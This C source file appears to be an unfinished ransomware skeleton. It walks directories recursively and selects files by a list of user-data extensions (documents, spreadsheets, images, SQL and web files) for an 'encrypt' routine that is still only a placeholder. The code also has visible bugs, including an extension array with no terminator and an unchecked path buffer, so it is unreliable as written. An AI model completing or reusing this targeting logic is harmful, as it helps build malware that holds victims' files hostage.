#include "encrypt.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <Lmcons.h>
#include <winsock2.h>
#include <dirent.h>
#include <sys/stat.h>

int fileEncrypt(const char* path)
{
    char *buffer;
    long filelen;
    FILE *fileptr;

    fileptr = fopen(path, "rb");  // Open the file in binary mode

    if (fileptr == NULL)
    {
        printf("Fatal error : could not open file \"%s\"", path);
        exit(-2);
    }

    fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
    filelen = ftell(fileptr);             // Get the current byte offset in the file
    rewind(fileptr);                      // Jump back to the beginning of the file

    buffer = malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
    if (buffer == NULL)
    {
        printf("Fatal error : could not allocate %ld bytes of memory", filelen);
        fclose(fileptr);
        exit(-1);
    }

    fread(buffer, filelen, 1, fileptr); // Read in the entire file

    for(int i = 0; i < filelen; i++)
    {
        printf("%c", buffer[i]);
        //Encrypt Here
    }

    printf("%s", buffer);

    free(buffer);
    fclose(fileptr); // Close the file

    return 0;
}

int folderEncrypt(const char* basePath)
{

    static const char* arrayExtensions[] = {".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};

    char path[1000];
    strcpy(path, basePath);

    struct dirent *dp;
    DIR *dir = opendir(basePath);

    if (!dir)
    {
        printf("Fatal error : could not open directory \"%s\"", basePath);
        exit(-2);
    }

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
            // ---- DEBUG ----
            printf("%s\n", path);
            //printf("%s\n", dp->d_name);

            // Construct new path from our base path
            strcpy(path, basePath);
            strcat(path, "/");
            strcat(path, dp->d_name);

            if (isDirectory(path))
            {
                folderEncrypt(path);
            }
            else
            {
                // Find the extension in the file name
                for (const char **currentExtension = arrayExtensions; *currentExtension; *currentExtension++)
                {
                    if(strstr(dp->d_name, *currentExtension) != NULL)
                    {
                        // Encrypt the file
                        fileEncrypt(path);
                    }
                }
            }
        }
    }

    closedir(dir);
    return 0;
}

int isDirectory(const char* path)
{
    struct stat sb;
    return stat(path, &sb) == 0 && S_ISDIR(sb.st_mode);
}
